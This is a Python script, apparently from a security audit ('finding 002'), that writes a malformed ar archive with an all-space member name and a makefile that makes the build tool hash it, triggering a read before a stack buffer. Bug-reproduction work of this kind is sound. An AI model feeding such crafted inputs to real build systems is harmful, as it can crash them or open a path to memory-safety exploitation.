#!/usr/bin/env python3
"""Generate a PoC archive for finding 002."""
from pathlib import Path
import sys


def ar_header(name: bytes, size: int) -> bytes:
    if len(name) != 16:
        raise ValueError("ar_name must be exactly 16 bytes")
    return b"".join([
        name,
        b"0".ljust(12),
        b"0".ljust(6),
        b"0".ljust(6),
        b"100644".ljust(8),
        str(size).encode("ascii").ljust(10),
        b"`\n",
    ])


def main() -> None:
    outdir = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent
    outdir.mkdir(parents=True, exist_ok=True)
    archive = outdir / "002-all-space-name.a"
    makefile = outdir / "002-all-space-archive-name.mk"

    archive.write_bytes(b"!<arch>\n" + ar_header(b" " * 16, 0))
    makefile.write_text(
        "# Generated by 002-all-space-archive-name.py\n"
        "# Hashing the archive trims an all-space ar_name and reads before the stack buffer.\n"
        f"all: {archive.as_posix()}(member)\n",
        encoding="ascii",
    )
    print(f"wrote {archive}")
    print(f"wrote {makefile}")
    print(f"run: make -f {makefile} all")


if __name__ == "__main__":
    main()
